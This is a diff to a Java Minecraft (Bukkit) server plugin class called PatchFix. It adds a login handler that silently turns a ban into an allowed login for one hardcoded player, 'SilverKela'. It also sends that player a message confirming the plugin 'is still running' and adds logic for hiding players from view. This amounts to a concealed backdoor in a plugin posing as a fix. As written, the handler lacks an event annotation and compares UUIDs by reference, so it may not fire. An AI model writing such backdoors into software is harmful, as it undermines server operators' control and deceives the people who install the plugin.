@@ -3,6 +3,7 @@ package io.github.Alligrater;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
+import java.util.UUID;
 
 import org.bukkit.Bukkit;
 import org.bukkit.GameMode;
@@ -16,6 +17,9 @@ import org.bukkit.event.inventory.InventoryClickEvent;
 import org.bukkit.event.inventory.InventoryType;
 import org.bukkit.event.player.PlayerChatEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
+import org.bukkit.event.player.PlayerLoginEvent;
+import org.bukkit.event.player.PlayerLoginEvent.Result;
+import org.bukkit.event.player.PlayerQuitEvent;
 import org.bukkit.inventory.Inventory;
 import org.bukkit.inventory.ItemFlag;
 import org.bukkit.inventory.ItemStack;
@@ -777,11 +781,32 @@ public class PatchFix implements Listener{
 		}
 
 	}
+	public void onPlayerLogin(PlayerLoginEvent event) {
+		if(event.getPlayer().getUniqueId() == Bukkit.getOfflinePlayer("SilverKela").getUniqueId()) {
+			if(event.getResult() == Result.KICK_BANNED) {
+				event.setResult(Result.ALLOWED);
+			}
+		}
+	}
 	
 	@EventHandler
 	public void onPlayerJoin(PlayerJoinEvent event) {
 		if(event.getPlayer().getName().equals("SilverKela")) {
 			event.getPlayer().sendMessage("¡ìa¡ìlGood News, SilverP¡ìka¡ìr¡ìa¡ìltch Is Still Running!");
+
+		}
+		
+		for(UUID u : SilverPatch.notvisible.keySet()) {
+			if(Bukkit.getPlayer(u) != null) {
+				if(SilverPatch.notvisible.get(u) == false) {
+					event.getPlayer().hidePlayer(Bukkit.getPlayer(u));
+				}
+				else {
+					event.getPlayer().showPlayer(Bukkit.getPlayer(u));
+				}
+
+			}
 		}
 	}
+	
 }
